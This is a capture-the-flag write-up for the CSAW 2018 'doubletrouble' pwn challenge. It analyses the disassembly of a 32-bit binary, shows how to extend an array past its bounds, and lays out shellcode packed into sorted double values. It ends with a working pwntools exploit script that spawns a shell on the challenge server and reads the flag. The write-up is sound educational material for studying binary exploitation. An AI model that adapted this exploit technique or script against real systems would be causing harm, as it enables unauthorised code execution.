* **Category:** pwn  
* **Points:** 200  
* **Description:**

> Did you know every Number in javascript is a float  
>  
> `pwn.chal.csaw.io:9002`  
>  
> nsnc  
>  
>
> [doubletrouble](https://ctf.csaw.io/files/1615e939e4ae439f743a908512e8384b/doubletrouble)

## Writeup

Let us start by connecting to the service via netcat and see what it does:

```bash  
$ nc pwn.chal.csaw.io 9002  
0xffbd8018  
How long: 2  
2  
Give me: 1.5  
1.5  
Give me: 4  
4  
0:1.500000e+00  
1:4.000000e+00  
Sum: 5.500000  
Max: 4.000000  
Min: 1.500000  
My favorite number you entered is: 1.500000  
Sorted Array:  
0:1.500000e+00  
1:4.000000e+00  
```

Looks like it prints an address, then asks for a number of inputs, then  
asks that number of times for a double number (the callenge name gave that  
away) and finally prints some statistics and the sorted array.

We also get an elf binary, so let's start with `checksec`:

```bash  
$ checksec doubletrouble  
   Arch:     i386-32-little  
   RELRO:    Partial RELRO  
   Stack:    Canary found  
   NX:       NX disabled  
   PIE:      No PIE  
```

Interesting, our stack is executable. Surely that is not by mistake.  
Lets continue analyzing the main function. It seems to be doing something like  
this:

```c  
int main(int argc, const char **argv)  
{  
 setvbuf(stdin, 0, 2, 0);  
 game();  
 return 0;  
}  
```

The only important thing it does is calling `game`, so let's continue there:

```nasm  
(fcn) sym.game 633  
  sym.game ();  
          ; var int local_21ch @ ebp-0x21c  
          ; var signed int local_218h @ ebp-0x218  
          ; var char *str @ ebp-0x214  
          ; var int local_210h @ ebp-0x210  
          ; var int canary @ ebp-0xc  
          ; var int local_8h @ ebp-0x8  
          ; CALL XREF from sym.main (0x804983c)  
          0x08049506 b    55             push ebp  
          0x08049507      89e5           mov ebp, esp  
          0x08049509      56             push esi  
          0x0804950a      53             push ebx  
          0x0804950b      81ec20020000   sub esp, 0x220  
          0x08049511      e81afcffff     call sym.__x86.get_pc_thunk.bx  
          0x08049516      81c3ea2a0000   add ebx, 0x2aea  
          0x0804951c      65a114000000   mov eax, dword gs:[0x14]    ; [0x14:4]=-1 ; 20  
          0x08049522      8945f4         mov dword [canary], eax  
          0x08049525      31c0           xor eax, eax  
```

So as we saw earlier, this function uses a stack canary.

```nasm  
          0x08049527      83ec08         sub esp, 8  
          0x0804952a      8d85f0fdffff   lea eax, dword [local_210h]  
          0x08049530      50             push eax  
          0x08049531      8d8310e0ffff   lea eax, dword [ebx - 0x1ff0]  
          0x08049537      50             push eax                    ; const char *format  
          0x08049538      e8f3faffff     call sym.imp.printf         ; int printf(const char *format)  
          0x0804953d      83c410         add esp, 0x10  
          0x08049540      83ec0c         sub esp, 0xc  
          0x08049543      8d8314e0ffff   lea eax, dword str.How_long: ; 0x804a014 ; "How long: "  
          0x08049549      50             push eax                    ; const char *format  
          0x0804954a      e8e1faffff     call sym.imp.printf         ; int printf(const char *format)  
          0x0804954f      83c410         add esp, 0x10  
```

The next thing it does is printing the address of our local variable
`local_210h`.  
Then it asks for how long our input will be.

```nasm  
          0x08049552      83ec08         sub esp, 8  
          0x08049555      8d85e4fdffff   lea eax, dword [local_21ch]  
          0x0804955b      50             push eax  
          0x0804955c      8d831fe0ffff   lea eax, dword [ebx - 0x1fe1]  
          0x08049562      50             push eax                    ; const char *format  
          0x08049563      e858fbffff     call sym.imp.__isoc99_scanf ; int scanf(const char *format)  
          0x08049568      83c410         add esp, 0x10  
          0x0804956b      e8d0faffff     call sym.imp.getchar        ; int getchar(void)  
          0x08049570      8b85e4fdffff   mov eax, dword [local_21ch]  
          0x08049576      83f840         cmp eax, 0x40               ; '@' ; 64  
      ╭─< 0x08049579      7e23           jle 0x804959e  
      │   0x0804957b      83ec08         sub esp, 8  
      │   0x0804957e      8b83f0ffffff   mov eax, dword [ebx - 0x10]  
      │   0x08049584      50             push eax  
      │   0x08049585      8d8324e0ffff   lea eax, dword str.Flag:_hahahano._But_system_is_at__d ; 0x804a024 ; "Flag: hahahano. But system is at %d"  
      │   0x0804958b      50             push eax                    ; const char *format  
      │   0x0804958c      e89ffaffff     call sym.imp.printf         ; int printf(const char *format)  
      │   0x08049591      83c410         add esp, 0x10  
      │   0x08049594      83ec0c         sub esp, 0xc  
      │   0x08049597      6a01           push 1                      ; 1 ; int status  
      │   0x08049599      e8f2faffff     call sym.imp.exit           ; void exit(int status)  
      │   ; CODE XREF from sym.game (0x8049579)  
      ╰─> 0x0804959e      c785e8fdffff.  mov dword [local_218h], 0  
```

It reads a number  with scanf, followed by a getchar with the result being  
ignored. If we input a number greater than 64, it taunts us and tells us the  
address of `system`. Interesting that for this to be possible, `system` must
be  
in the GOT and could therefore be a target for our exploit.

```nasm  
      ╰─> 0x0804959e      c785e8fdffff.  mov dword [local_218h], 0  
      ╭─< 0x080495a8      eb68           jmp 0x8049612  
      │   ; CODE XREF from sym.game (0x804961e)  
     ╭──> 0x080495aa      83ec0c         sub esp, 0xc  
     ││   0x080495ad      6a64           push 0x64                   ; 'd' ; 100 ; size_t size  
     ││   0x080495af      e8bcfaffff     call sym.imp.malloc         ; void *malloc(size_t size)  
     ││   0x080495b4      83c410         add esp, 0x10  
     ││   0x080495b7      8985ecfdffff   mov dword [str], eax  
     ││   0x080495bd      83ec0c         sub esp, 0xc  
     ││   0x080495c0      8d8348e0ffff   lea eax, dword str.Give_me: ; 0x804a048 ; "Give me: "  
     ││   0x080495c6      50             push eax                    ; const char *format  
     ││   0x080495c7      e864faffff     call sym.imp.printf         ; int printf(const char *format)  
     ││   0x080495cc      83c410         add esp, 0x10  
     ││   0x080495cf      8b83f8ffffff   mov eax, dword [ebx - 8]  
     ││   0x080495d5      8b00           mov eax, dword [eax]  
     ││   0x080495d7      83ec04         sub esp, 4  
     ││   0x080495da      50             push eax                    ; FILE *stream  
     ││   0x080495db      6a64           push 0x64                   ; 'd' ; 100 ; int size  
     ││   0x080495dd      ffb5ecfdffff   push dword [str]            ; char *s  
     ││   0x080495e3      e868faffff     call sym.imp.fgets          ; char *fgets(char *s, int size, FILE *stream)  
     ││   0x080495e8      83c410         add esp, 0x10  
     ││   0x080495eb      8bb5e8fdffff   mov esi, dword [local_218h]  
     ││   0x080495f1      8d4601         lea eax, dword [esi + 1]    ; 1  
     ││   0x080495f4      8985e8fdffff   mov dword [local_218h], eax  
     ││   0x080495fa      83ec0c         sub esp, 0xc  
     ││   0x080495fd      ffb5ecfdffff   push dword [str]            ; const char *str  
     ││   0x08049603      e8c8faffff     call sym.imp.atof           ; double atof(const char *str)  
     ││   0x08049608      83c410         add esp, 0x10  
     ││   0x0804960b      dd9cf5f0fdff.  fstp qword [ebp + esi*8 - 0x210]  
     ││   ; CODE XREF from sym.game (0x80495a8)  
     │╰─> 0x08049612      8b85e4fdffff   mov eax, dword [local_21ch]  
     │    0x08049618      3985e8fdffff   cmp dword [local_218h], eax ; [0x13:4]=-1 ; 19  
     ╰──< 0x0804961e      7c8a           jl 0x80495aa  
```

Next is the input loop. The C code would look something like this:

```c  
i = 0;  
while ( i < how_many )  
{  
 void* temp_buffer = malloc(100);  
 printf("Give me: ");  
 fgets(temp_buffer, 100, stdin);  
 i++;  
 stack_buffer[i] = atof(s);  
}  
```

We can see that `temp_buffer` leaks memory as it is never freed,  
but it is not relevant for the challenge.  
What is more important is where our data is written. It is stored at a  
buffer on our stack that consists of 64 doubles.

The last part of the `game` function looks something like this (the function  
names were in the debug symbols):

```c  
printArray(&how_many, stack_buffer);  
sum = sumArray(&how_many, stack_buffer);  
printf("Sum: %f\n", (double)sum);  
max = maxArray(&how_many, stack_buffer);  
printf("Max: %f\n", (double)max);  
min = minArray(&how_many, stack_buffer);  
printf("Min: %f\n", (double)min);  
found_idx = findArray(&how_many, stack_buffer, -100.0, -10.0);  
printf("My favorite number you entered is: %f\n", stack_buffer[found_idx]);  
sortArray(&how_many, stack_buffer);  
puts("Sorted Array:");  
printArray(&how_many, stack_buffer);  
return result;  
```

The `printArray`, `sumArray`, `maxArray` and `minArray` all look quite
straight  
forward, but the function that selects the "favorite number" looks strange:

```c  
int findArray(int *size, double *stack_buffer, double lower_bound, double
upper_bound)  
{  
 int idx = *size;  
 while ( *size < 2 * idx )  
 {  
   if ( stack_buffer[*size - idx] > lower_bound && upper_bound >
stack_buffer[*size - idx] )  
     return *size - idx;  
   (*size)++;  
 }  
 *size = idx;  
 return 0;  
}  
```

This function actually writes back to the original size. And it adds to the
size  
if a number is between -10 and -100. It does so by adding 1 to the size for
each  
number until it hits a number in the range. This will be the "favorite
number".  
If it does not encounter a number in that range, the size is reset to the  
original value.

Let us quickly test our observation:

```bash  
$ nc pwn.chal.csaw.io 9002  
0xffb38c58  
How long: 2  
2  
Give me: 10  
10  
Give me: -20  
-20  
0:1.000000e+01  
1:-2.000000e+01  
Sum: -10.000000  
Max: 10.000000  
Min: -20.000000  
My favorite number you entered is: -20.000000  
Sorted Array:  
0:-2.000000e+01  
1:-2.102842e-23  
2:1.000000e+01  
```

Yay! If we enter a number in this range, we can change the size of the array.  
So what is below the array on the stack? When we input 64 numbers and then  
extend the size, the binary suddenly starts complaining that a stack smashing  
has been detected. Looks like the operation that follows `findArray`, which is  
`sortArray` took the new length and sorted the stack canary away.

We also know that C stores doubles as 8 byte numbers which have the following  
three parts:

1. Sign bit: 1 bit  
2. Exponent: 11 bits  
3. Fraction: 52 bits

Stored in little endian, this looks like this:

```  
| 1 byte | 1 byte | 1 byte | 1 byte | 1 byte | 1 byte | 1 byte | 1 byte |  
|ffffffff|ffffffff|ffffffff|ffffffff|ffffffff|ffffffff|eeeeffff|seeeeeee|

s = Sign bit  
e = Exponent  
f = Fraction  
```

The first 6 bytes are only used for the fraction, the last two store the  
exponent and the sign bit.

After some experimenting we concluded that the memory layout of our stack must  
look like this:

```  
| 1 byte | 1 byte | 1 byte | 1 byte | 1 byte | 1 byte | 1 byte | 1 byte |  
|ffffffff|ffffffff|ffffffff|ffffffff|ffffffff|ffffffff|eeeeffff|seeeeeee|  
| --------------------    other stack variables    -------------------- |  
| --------------------           ...               -------------------- |  
| --------------------  stack_buffer[0] (8 bytes)  -------------------- |  
| --------------------  stack_buffer[1] (8 bytes)  -------------------- |  
| --------------------           ...               -------------------- |  
| --------------------  stack_buffer[62] (8 bytes) -------------------- |  
| --------------------  stack_buffer[63] (8 bytes) -------------------- |  
| -----         empty          ---- | ----         empty            --- |  
| -----         empty          ---- | ---- stack canary (4 bytes)   --- |  
| ----- base pointer (4 bytes) ---- | ---- return address (4 bytes) --- |  
```

We now have an idea on how to pwn this. We need to extend our array by 3
entries.  
The stack canary needs to stay at the same position, otherwise the stack  
check fails and we loose. We must also overwrite the return address with the  
address of our shellcode, which we can write into the stack buffer. Choosing
the  
values for our exponents wisely, we have a sequence of 6 bytes of usable  
shellcode followed by two bytes reserved for correct sorting of our code. Yes,  
we need to make sure our shellcode only consists of ascending double values.

But there is one more problem we have to get around: The address of our stack  
buffer is a very high 32 bit value (like `0xffebe328`) If we try to convert it  
into a double number, we end up with a very highly negative number. This would  
mean that it is going to be sorted to the top of our array.

We thought about this for some time and came up with the following solution:  
We do not need to return to the stack buffer directly.  
Instead we can return to another address in the code which leads to a `ret`.  
We can then insert another return address right behind the first one,  
which has no restrictions on its value, and let it point to our shellcode.  
It would of course have been possible to ROP our way to a shell by just  
inserting an address to code in every second position, but we chose to execute  
our doubles as shellcode instead.

The shellode to be injected was as follows (`?` marks address immediates  
which are only known at runtime):

```nasm  
b8 ?? ?? ?? ??  mov eax, addr_of_sh  
50              push eax  
b8 ?? ?? ?? ??  mov eax, got[system]  
ff d0           call eax

addr_of_sh:     "sh\x00"  
```

Those instructions are at most 5 bytes long. So we have one byte to bridge the  
execution to the next double value. This is not enough for a jump instruction,  
which would take two bytes. But we can just move an arbitrary constant to any  
unused register like `ebx`. This only takes 1 byte and uses the following 4  
bytes as an immediate that is irrelevant to what our shellcode does. The final  
shellocde looks like this (`x` marks the parts that will be interpreted as  
exponent and are therefore not arbitrary):

```nasm  
b8 ?? ?? ?? ??  mov eax, addr_of_sh  
bb xx xx .. ..  mov ebx, ignored  
50              push eax  
bb .. .. xx xx  mov ebx, ignored  
b8 ?? ?? ?? ??  mov eax, got[system]  
bb xx xx .. ..  mov ebx, ignored  
ff d0           call eax

addr_of_sh:     "sh\x00"  
```

The `sh\x00` string can be placed below our payload in a seperate double
value.

Putting it all together, after our attack runs, the stack looks like this:

```  
|ffffffff|ffffffff|ffffffff|ffffffff|ffffffff|ffffffff|eeeeffff|seeeeeee|  
| 1 byte | 1 byte | 1 byte | 1 byte | 1 byte | 1 byte | 1 byte | 1 byte |  
| --------------------    other stack variables    -------------------- |  
| --------------------           ...               -------------------- |      ...  
|   b8   |   ??   |   ??   |   ??   |   ??   |   bb   |   xx   |   xx   | stack_buffer[0]  
|   ..   |   ..   |   50   |   bb   |   ..   |   ..   |   xx   |   xx   | stack_buffer[1]  
|   b8   |   ??   |   ??   |   ??   |   ??   |   bb   |   xx   |   xx   | stack_buffer[2]  
|   ..   |   ..   |   ff   |   d0   |   ..   |   ..   |   xx   |   xx   | stack_buffer[3]  
|   's'  |   'h'  |   00   |   ..   |   ..   |   ..   |   xx   |   xx   | stack_buffer[4]  
| --------------------           ...               -------------------- |      ...  
|   ..   |   ..   |   ..   |   ..   |   ..   |   ..   |   xx   |   xx   | stack_buffer[63]  
|   ..   |   ..   |   ..   |   ..   |   ..   |   ..   |   xx   |   xx   | stack_buffer[64]  
|   ..   |   ..   |   ..   |   ..   |      stack canary (4 bytes)       | stack_buffer[65]  
|   ..   |   ..   |   ..   |   ..   |   addr of any `ret` instruction   | stack_buffer[66]  
|      addr off stack_buffer[0]     |   ..   |   ..   |   xx   |   xx   | stack_buffer[67]  
```

As you can see, we are free to insert into the `xx` bytes whatever we want  
and the shellcode stays the same. This is very useful as we need our code to  
be sorted in this exact order. To do so, we choose ascending exponents at the  
start and very high exponents at the last number. Now we run the exploit  
multiple times and try to get lucky with the stack canary. Because the value
of  
the stack canary is random, we have only a slim chance of having it being
sorted  
into the correct slot.

After about 80-100 tries, we finally got lucky and got a shell. We then just  
had to print the flag via `cat flag.txt`.

## Files

The attack script could have been written with more emphasis on readability,  
but during a CTF this is often times not possible.

### exp.py

```python  
from pwn import *  
import struct  
import binascii

context.terminal = ["gnome-terminal", "--", "bash", "-c"]

#context.log_level = 'info'

count = 64

def float_bytes(bs, idx):  
   assert 1 <= idx <= 0xffe  
   return bs.ljust(6, b"\x90") + (idx << 4).to_bytes(2, 'little')

def float_unpack(bs):  
   return struct.unpack("d", bs)[0]

def float_pack(bs):  
   return struct.pack("d", bs)

def float_fmt(fl):  
   return "{:.90e}".format(fl)

def quick_fmt(bs, idx):  
   print("formatting: {}".format(bs))  
   return float_fmt(float_unpack(float_bytes(bs, idx)))

def send_arr_size(r, size):  
   r.readuntil('How long: ')  
   r.sendline(size)

def send_item(r, it, state):  
   print("sending item {}: {}".format(state["count"], it))  
   state["count"] += 1  
   r.readuntil('Give me: ')  
   r.sendline(it)  
   r.readline()

def send_rest(r, it, state):  
   while state["count"] < 64:  
       send_item(r, it, state)

def parse_response(r):  
   sorted = False  
   orig = {}  
   after = {}  
   try:  
       while True:  
           line = r.readline()  
           print("line is "+str(line))  
           if line == b"Sorted Array:\n":  
               sorted = True  
               continue  
           sp = line.split(b":")  
           if sp[0] == b"*** stack smashing detected ***":  
               return (False, orig, after)  
           if len(sp) < 2:  
               break  
           if not sorted:  
               orig[sp[0]] = sp[1]  
           else:  
               after[sp[0]] = sp[1]  
   except EOFError:  
       pass  
   return (True, orig, after)

uhex = binascii.unhexlify

while True:  
   try:  
       myreturnop = 0x0804984F # just some address in the code that contains `ret`  
       r = remote("pwn.chal.csaw.io", 9002)  
       #r = process("./doubletrouble", env = {})  
       #r = gdb.debug("./doubletrouble", "break *0x0804984F\nc", env = {})  
       stack_addr = int(r.readline(), 16)  
       print("stack addr: 0x{:08x}".format(stack_addr))

       #gdb.attach(r)  
       in_range = "-99"  
       oo_range = quick_fmt(b"\xCC"*6, 0xff8)  
       oo_range = "-1e+306"

       state = {"count": 0}

       retptr = float_fmt(float_unpack((myreturnop).to_bytes(4, 'little').rjust(8, b"\x90")))  
       stage2 = float_fmt(float_unpack(stack_addr.to_bytes(4, 'little') + (myreturnop + 0x01000000).to_bytes(4, 'little')))  
       print("retptr: " + retptr)

       addr_of_sh = stack_addr + 8 * 4  
       addr_of_system = 0x0804BFF0

       send_arr_size(r, str(count))  
       for i in range(4):  
           send_item(r, oo_range, state)  
       send_item(r, in_range, state)

       send_item(r, retptr, state)  
       send_item(r, stage2, state)

       # "mov eax, addr_of_sh" "mov ebx, ignored"  
       send_item(r, quick_fmt(uhex("b8") + addr_of_sh.to_bytes(4, 'little') + uhex("bb"), 0xffd), state)  
       # "ignored" "push eax"  
       send_item(r, quick_fmt(uhex("ffff" + "50" + "bb" + "ffff"), 0xffc), state)  
       # "mov eax, addr_of_system" "mov ebx, ignored"  
       send_item(r, quick_fmt(uhex("b8") + addr_of_system.to_bytes(4, 'little') + uhex("bb"), 0xffb), state)  
       # "ignored" "call eax"  
       send_item(r, quick_fmt(uhex("ffff" + "8b00" + "ffd0" ), 0xffa), state)  
       send_item(r, quick_fmt(b"sh\x00", 0xff9), state)  
       send_rest(r, oo_range, state)

       r.sendline("cat flag.txt")

       success, orig, after = parse_response(r)  
       print("done parsing")  
       if not success:  
           r.close()  
           continue

       for i, e in after.items():  
           num = float(e)  
           form = binascii.hexlify(float_pack(num))  
           print("{:04}: {} ({})".format(int(i), form, num))

       r.interactive()  
       break

   except Exception as e:  
       print(e)  
```

Original writeup (https://hack.more.systems/writeup/2018/09/20/csawctfquals-
doubletrouble/).